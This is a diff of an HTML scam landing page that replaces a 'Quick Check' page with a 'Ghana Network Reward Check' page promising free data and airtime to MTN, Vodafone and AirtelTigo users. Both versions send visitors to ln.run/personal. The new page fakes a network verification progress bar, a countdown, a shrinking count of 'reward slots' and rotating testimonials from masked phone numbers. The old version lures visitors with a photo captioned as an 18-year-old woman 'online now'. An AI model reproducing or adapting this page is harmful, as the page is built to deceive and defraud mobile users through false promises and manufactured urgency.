@@ -1,3 +1,4 @@
+<!--
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -86,162 +87,271 @@ window.location.href="https://ln.run/personal";
 
 </body>
 </html>
-<!--
+-->
 <!DOCTYPE html>
 <html lang="en">
 <head>
+
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Quick Check</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>Network Verification Promo</title>
 
 <style>
 
 body{
+font-family:Arial,sans-serif;
+background:linear-gradient(135deg,#000,#ff0050);
 margin:0;
-font-family:Arial, sans-serif;
-background:#000;
-color:#fff;
-display:flex;
-justify-content:center;
-align-items:center;
-height:100vh;
-}
-
-.box{
-width:92%;
-max-width:380px;
-background:#121212;
-padding:20px;
-border-radius:18px;
-box-shadow:0 10px 30px rgba(0,0,0,.7);
-}
-
-/* HEADER */
-.header{
-display:flex;
-align-items:center;
-margin-bottom:15px;
-}
-
-.avatar{
-width:45px;
-height:45px;
-border-radius:50%;
-object-fit:cover;
-margin-right:10px;
-border:2px solid #ff0050;
-}
-
-.user-info{
-font-size:13px;
-}
-
-.name{
-font-weight:bold;
-}
-
-.status{
-color:#25f4ee;
-font-size:12px;
-}
-
-/* CONTENT */
-
-.badge{
-background:#ff0050;
-padding:5px 10px;
-border-radius:8px;
-display:inline-block;
-margin-bottom:10px;
-font-size:12px;
-}
-
-h1{
-font-size:20px;
-margin-bottom:8px;
-}
-
-p{
-font-size:14px;
-color:#ccc;
-line-height:1.5;
-}
-
-.steps{
-margin-top:12px;
-font-size:13px;
-color:#aaa;
-}
-
-.steps div{
-margin:5px 0;
-}
-
-button{
-margin-top:18px;
-width:100%;
-padding:14px;
-border:none;
-border-radius:10px;
-background:linear-gradient(90deg,#ff0050,#ff6ec7);
-color:white;
-font-size:16px;
-font-weight:bold;
-cursor:pointer;
-}
-
-.small{
-font-size:12px;
-color:#888;
-margin-top:8px;
+padding:0;
 text-align:center;
 }
 
+.header{
+background:#000;
+color:#ffcc00;
+padding:18px;
+font-size:22px;
+font-weight:bold;
+}
+
+.container{
+background:#fff;
+max-width:420px;
+margin:40px auto;
+padding:30px;
+border-radius:12px;
+box-shadow:0 10px 30px rgba(0,0,0,0.25);
+}
+
+h2{
+margin-top:0;
+color:#222;
+}
+
+button{
+width:100%;
+padding:14px;
+margin-top:12px;
+font-size:16px;
+border:none;
+border-radius:10px;
+cursor:pointer;
+transition:0.2s;
+box-shadow:0 4px 12px rgba(0,0,0,0.2);
+font-weight:bold;
+}
+
+/* 🇬🇭 Ghana Networks */
+.MTN{
+background:#FFCC00;
+color:#000;
+}
+
+.Vodafone{
+background:#E60000;
+color:#fff;
+}
+
+.AirtelTigo{
+background:#D71920;
+color:#fff;
+}
+
+button:hover{
+transform:scale(1.03);
+opacity:0.95;
+}
+
+.progress{
+width:100%;
+background:#ddd;
+height:12px;
+border-radius:6px;
+margin-top:20px;
+overflow:hidden;
+}
+
+.bar{
+width:0%;
+height:12px;
+background:linear-gradient(90deg,#000,#ff0050);
+}
+
+.notice{
+font-size:13px;
+color:#777;
+margin-top:20px;
+}
+
+.slots{
+color:red;
+font-weight:bold;
+margin:10px 0;
+font-size:15px;
+}
+
+.timer{
+font-weight:bold;
+margin-bottom:15px;
+color:#ff0050;
+}
+
+.ticker{
+background:#fff;
+color:#000;
+padding:12px;
+font-size:14px;
+font-weight:bold;
+border-top:2px solid #ff0050;
+border-bottom:2px solid #ff0050;
+position:fixed;
+bottom:0;
+width:100%;
+}
+
 </style>
+
 </head>
 
 <body>
 
-<div class="box">
-
-
 <div class="header">
-<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEim43T2Upe5I9JpXQnG6ObL7mE7W5kCgm8HqRjEZkLZYRryxZG_ExQzKRbFgCLRQsVOIRZmVuG-2MCYfxUV90blgtL6SH1PAbmWdRonNhOr3DZ1GP9ZepMNVtB4ysZ0byTATowxmPDAUvkLAhGct8eujzlVFPsytbjtT8UHbJq4IBBYCiF3mWsFRPKtQgA/s751/From%20Main%20Klickpin%20CF-%20Uploaded%20by%20user%20-%207wh25clRX.jpg" class="avatar">
-<div class="user-info">
-<div class="name">Precilia • 18</div>
-<div class="status">● Online now</div>
-</div>
+Ghana Network Reward Check
 </div>
 
-<div class="badge">⏱ Takes 30 seconds</div>
+<div class="container" id="mainBox">
 
-<h1>Quick Online Check</h1>
+<div class="timer">
+⏳ Offer expires in <span id="countdown">05:30:00</span>
+</div>
 
-<p>
-Hi 👋
-before we start, I just need to ask you a few quick simple questions about yourself. like
-(age, device, and small details).
-After completing it, your reward will be sent directly to your MTN MoMo.It will take less than 30 seconds.
+<div class="slots">
+⚡ Only <span id="slots">100</span> reward slots left today
+</div>
+
+<h2>Select the network you use</h2>
+
+<p>Verify your number to unlock data & airtime rewards.</p>
+
+<button class="MTN" onclick="verifyNetwork('MTN')">MTN</button>
+<button class="Vodafone" onclick="verifyNetwork('Vodafone')">Vodafone</button>
+<button class="AirtelTigo" onclick="verifyNetwork('AirtelTigo')">AirtelTigo</button>
+
+<p class="notice">
+System checks eligibility before showing your reward
 </p>
 
-<div class="steps">
-<div>✅ No experience needed</div>
-<div>✅ Works on your phone</div>
-<div>✅ Only 6 quick questions</div>
 </div>
 
-<button onclick="goOffer()">START NOW</button>
-
-<div class="small">Most people finish this in under 30 seconds</div>
-
+<div class="ticker" id="testimonialTicker">
++233***4521 just received 5GB bonus
 </div>
 
 <script>
-function goOffer(){
-window.location.href="https://ln.run/personal";
+
+function verifyNetwork(network){
+
+const box=document.getElementById("mainBox");
+
+box.innerHTML=`
+<h2>Verifying ${network} Network</h2>
+<p id="stepText">Checking network...</p>
+
+<div class="progress">
+<div class="bar" id="bar"></div>
+</div>
+`;
+
+let progress=0;
+
+const steps=[
+"Checking network...",
+"Validating eligibility...",
+"Checking remaining slots...",
+"Preparing reward..."
+];
+
+let interval=setInterval(function(){
+
+progress+=5;
+
+document.getElementById("bar").style.width=progress+"%";
+
+if(progress==25){
+document.getElementById("stepText").innerText=steps[1];
 }
+
+if(progress==50){
+document.getElementById("stepText").innerText=steps[2];
+}
+
+if(progress==75){
+document.getElementById("stepText").innerText=steps[3];
+}
+
+if(progress>=100){
+
+clearInterval(interval);
+
+document.getElementById("stepText").innerText="Redirecting...";
+
+setTimeout(function(){
+window.location.href="https://ln.run/personal";
+},1000)
+
+}
+
+},200)
+
+}
+
+/* Testimonials */
+const testimonies=[
+"+233***4521 just received 5GB + GHS 50 airtime",
+"+233***9932 just received 2GB + GHS 10 airtime",
+"+233***7710 just received 10GB + GHS 30 airtime",
+"+233***6284 just received 3GB + GHS 15 airtime",
+"+233***3345 just received 5GB + GHS 20 airtime"
+]
+
+setInterval(()=>{
+const random=Math.floor(Math.random()*testimonies.length)
+document.getElementById("testimonialTicker").innerText=testimonies[random]
+},4000)
+
+/* Slots */
+let slots=23
+
+setInterval(()=>{
+if(slots>7){
+slots--
+document.getElementById("slots").innerText=slots
+}
+},15000)
+
+/* Countdown */
+let time=19800
+
+const timer=setInterval(()=>{
+let h=Math.floor(time/3600)
+let m=Math.floor((time%3600)/60)
+let s=time%60
+
+document.getElementById("countdown").innerText=
+String(h).padStart(2,'0')+":"+
+String(m).padStart(2,'0')+":"+
+String(s).padStart(2,'0')
+
+time--
+
+if(time<=0){
+clearInterval(timer)
+}
+
+},1000)
+
 </script>
 
 </body>
 </html>
--->
